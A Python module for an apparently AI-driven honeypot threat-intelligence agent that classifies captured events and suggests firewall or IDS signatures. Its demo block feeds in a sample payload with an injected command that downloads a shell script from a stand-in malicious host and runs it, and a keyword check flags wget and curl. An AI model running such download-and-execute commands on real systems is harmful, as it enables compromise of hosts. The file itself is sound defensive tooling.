import json
from app.core.llm import call_llm
from app.core.honeypot_toolkit import HoneypotToolkit

class ThreatIntelAgent:
    """
    T-Pot Inspired Threat Intelligence Agent.
    Operates in the Swarm ecosystem to analyze honeypot captures, identify 
    vulnerabilities being targeted, profile threat actors, and distribute 
    defensive signatures to other agents.
    """
    
    def __init__(self):
        self.honeypot = HoneypotToolkit()
        self.honeypot.start_mock_listener("SSH", 2222)
        self.honeypot.start_mock_listener("HTTP", 8080)
        self.honeypot.start_mock_listener("Telnet", 23)

    def _retrieve_threat_intel(self, source_ip: str, payload: str) -> str:
        """
        Mocks RAG retrieval against global threat intel feeds (e.g., AlienVault OTX, Greynoise).
        """
        # Simulated VectorDB / Threat Intel response
        if "wget" in payload or "curl" in payload:
            return f"Context: Payload matches known Mirai botnet deployment scripts. IP {source_ip} was flagged 2 days ago for mass scanning."
        if "root:" in payload:
            return f"Context: Standard SSH credential stuffing attack. IP {source_ip} is part of a known proxy network."
        return "Context: No specific historic match found. Potentially novel zero-day or targeted reconnaissance."

    def analyze_honeypot_capture(self, event: dict) -> dict:
        """
        Analyzes a captured packet/payload using Generative AI.
        """
        # RAG Retrieval
        ip = event.get("source_ip", "unknown")
        payload = event.get("raw_payload", "")
        rag_context = self._retrieve_threat_intel(ip, payload)
        
        prompt = f"""
        Act as a Tier-3 Security Operations Center (SOC) Analyst managing a global T-Pot honeypot network.
        Analyze the following captured network event and provide threat intelligence.
        
        ### Captured Event:
        {json.dumps(event, indent=2)}
        
        ### Global Threat Intel Context (RAG):
        {rag_context}
        
        Provide a detailed JSON response identifying:
        1. Attack Type (e.g., Credential Stuffing, RCE, Botnet Propagation).
        2. Potential CVE targeted (if applicable, guess based on payload).
        3. Attacker Profile (Script Kiddie, APT, Botnet).
        4. Remediation / Defensive Signature (e.g., Suricata/Snort rule logic or firewall block suggestion).
        
        Return ONLY valid JSON:
        {{
            "attack_type": "...",
            "targeted_cve": "...",
            "attacker_profile": "...",
            "defensive_signature": "...",
            "severity": "CRITICAL|HIGH|MEDIUM|LOW"
        }}
        """
        
        # We wrap the LLM call in a try/except in case the quota fails locally, 
        # allowing us to simulate the output for demonstration.
        try:
            llm_response = call_llm(prompt, json_mode=True)
            analysis = json.loads(llm_response)
        except Exception as e:
            # Fallback for local testing if quota_manager fails
            analysis = {
                "attack_type": "Simulated Fallback - Botnet Propagation",
                "targeted_cve": "Unknown/Generic",
                "attacker_profile": "Automated Scanner",
                "defensive_signature": f"iptables -A INPUT -s {ip} -j DROP",
                "severity": "HIGH",
                "error_note": str(e)
            }

        return {
            "raw_capture": event,
            "threat_intelligence": analysis
        }

if __name__ == "__main__":
    agent = ThreatIntelAgent()
    
    # Simulate a Log4j or Mirai style attack hitting the HTTP honeypot
    test_attack = agent.honeypot.simulate_attack(
        service="HTTP", 
        source_ip="45.12.33.102", 
        payload="GET / HTTP/1.1\nUser-Agent: curl/7.68.0\nHost: 10.0.0.1\n\n; wget http://malicious.domain/malware.sh -O /tmp/m.sh; sh /tmp/m.sh"
    )
    
    report = agent.analyze_honeypot_capture(test_attack)
    print("\n--- THREAT INTEL REPORT ---")
    print(json.dumps(report, indent=2))
